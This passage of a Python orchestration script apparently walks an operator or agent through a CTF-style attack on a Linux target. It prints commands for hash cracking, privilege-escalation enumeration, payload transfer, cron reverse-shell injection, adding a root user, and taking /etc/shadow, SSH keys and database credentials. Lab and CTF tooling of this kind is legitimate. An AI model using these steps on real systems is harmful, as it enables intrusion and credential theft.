        print("    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt")
        print("    hashcat -m MODE hashes.txt /usr/share/wordlists/rockyou.txt")
        print()
        print("  REPORT: which credentials worked on which service/user")

    elif sub == 'privesc_enum':
        print(f"  📍 Phase: POST-EXPLOITATION → Privilege Escalation Enumeration")
        print()
        print("  READ: playbooks/privilege-escalation.md")
        print()
        print("  RUN ALL OF THESE (comprehensive check):")
        print("    # Quick wins")
        print("    sudo -l")
        print("    find / -perm -4000 -type f 2>/dev/null")
        print("    getcap -r / 2>/dev/null")
        print()
        print("    # Scheduled tasks")
        print("    cat /etc/crontab && ls -la /etc/cron* && crontab -l 2>/dev/null")
        print("    systemctl list-timers 2>/dev/null | head -15")
        print()
        print("    # Kernel & OS")
        print("    uname -a  # kernel version → search for exploits")
        print("    cat /etc/os-release | head -3")
        print()
        print("    # Mail & hints (CRITICAL — often contains clues!)")
        print("    cat /var/mail/* 2>/dev/null")
        print("    cat /var/spool/mail/* 2>/dev/null")
        print()
        print("    # Service analysis")
        print("    ps aux | grep '^root' | grep -v '\\[' | head -20")
        print("    systemctl list-units --type=service --state=running 2>/dev/null | head -20")
        print()
        print("    # Config files & databases")
        print("    find / -name '*.ini' -o -name '*.conf' -o -name '*.db' -o -name '*.sqlite' 2>/dev/null | grep -v proc | head -20")
        print("    find / -name '.env' -readable 2>/dev/null")
        print()
        print("    # Writable files & directories")
        print("    find /etc -writable 2>/dev/null | head -10")
        print("    find / -writable -type f 2>/dev/null | grep -vE 'proc|sys|run/user' | head -20")
        print()
        print("    # Internal services")
        print("    ss -tlnp")
        print("    cat /etc/hosts")
        print()
        print("    # Container/virtualization")
        print("    docker ps 2>/dev/null; id | grep docker")
        print("    ls /.dockerenv 2>/dev/null")
        print()
        print("  TRANSFER PSPY for hidden cron jobs:")
        print("    # On attacker: scp /path/to/pspy64 USER@TARGET:/tmp/")
        print("    # On target: timeout 120 /tmp/pspy64 -pf | grep UID=0")
        print()
        print("  REPORT: everything you find (sudo, SUID, kernel, mail hints, services, writable files)")

    elif sub == 'privesc_exploit':
        print(f"  📍 Phase: POST-EXPLOITATION → Exploit Privilege Escalation")
        privesc_vector = s.get('privesc_vector', 'unknown')
        print(f"  VECTOR DETECTED: {privesc_vector}")
        print()
        print("  COMMON PRIVESC PATHS (priority order):")
        print("    1. sudo -l misconfiguration → GTFOBins.github.io")
        print("    2. SUID binary abuse → GTFOBins.github.io")
        print("    3. Writable cron job → inject reverse shell")
        print("    4. Kernel exploit → searchsploit 'linux kernel VERSION'")
        print("    5. Docker/LXD group → mount host filesystem")
        print("    6. Service running as root → exploit through its config/interface")
        print("    7. Writable systemd service → modify ExecStart")
        print("    8. Capabilities abuse → getcap / GTFOBins")
        print("    9. NFS no_root_squash → mount and create SUID")
        print("   10. Writable /etc/passwd → add root user")
        print()
        print("  IF KERNEL EXPLOIT NEEDED:")
        print("    1. Check if target has gcc/make: which gcc make")
        print("    2. If no internet on target, compile locally and transfer:")
        print(f"       scp exploit USER@{target}:/tmp/")
        print("       OR python3 -m http.server 8080 + wget on target")
        print()
        print("  IF WEB APP RUNS AS LOW-PRIV USER BUT MANAGES ROOT SERVICES:")
        print("    → Can you write configs that root processes load?")
        print("    → Can you trigger a root process restart with modified config?")
        print("    → Check if backup restore can overwrite system files")
        print("    → Check MCP/API endpoints for config write capabilities")
        print()
        print("  REPORT: 'got root uid=0' or bash scripts/orchestrator.sh error 'exploit failed'")

    elif sub == 'root_flag':
        print(f"  📍 Phase: POST-EXPLOITATION → Get Root Flag")
        print()
        print("  YOU ARE ROOT. Grab everything:")
        print("    cat /root/root.txt")
        print("    cat /etc/shadow")
        print("    ls -la /root/")
        print("    cat /root/.bash_history 2>/dev/null")
        print()
        print("  REPORT: the root flag hash and any additional loot")

    elif sub == 'loot':
        print(f"  📍 Phase: POST-EXPLOITATION → Collect Loot")
        print()
        print("  COLLECT ALL VALUABLE DATA:")
        print("    cat /etc/shadow")
        print("    mysql -u USER -pPASS DB -e 'SELECT * FROM users' 2>/dev/null")
        print("    find / -name '*.conf' -exec grep -l 'pass' {} \\; 2>/dev/null | head -20")
        print("    cat /root/.ssh/id_rsa 2>/dev/null")
        print()
        print("  REPORT: all credentials and sensitive data found")

# ═══════════════════════════════════════════════════════════════
# REPORTING PHASE
# ═══════════════════════════════════════════════════════════════
elif phase == 'report':
    print(f"  📍 Phase: REPORTING → Write Attack Report")
    print()
    print(f"  Template: templates/attack-report-template.md")
    print(f"  Output:   {report_dir}/attack-report.md")
    print()
    print("  INCLUDE IN REPORT:")
    print("  ── Findings ──")
    for f in s.get('findings', []):
        print(f"    {f}")
    print("  ── Credentials ──")
    for c in s.get('credentials', []):
        print(f"    {c}")
    print("  ── Shells ──")
    for sh in s.get('shells', []):
        print(f"    {sh}")
    print("  ── Flags ──")
    for k, v in s.get('flags', {}).items():
        print(f"    {k}: {v}")
    print()
    print('  After writing report: bash scripts/orchestrator.sh report "report written"')

elif phase == 'complete':
    print("  🎉 ENGAGEMENT COMPLETE!")
    print()
    print(f"  Report: {report_dir}/attack-report.md")
    print()
    print("  ── Final Summary ──")
    for k, v in s.get('flags', {}).items():
        print(f"    🏴 {k}: {v}")
    for c in s.get('credentials', []):
        print(f"    🔑 {c}")

else:
    print(f"  Unknown phase: {phase}/{sub}")
    print("  Run: bash scripts/orchestrator.sh status")
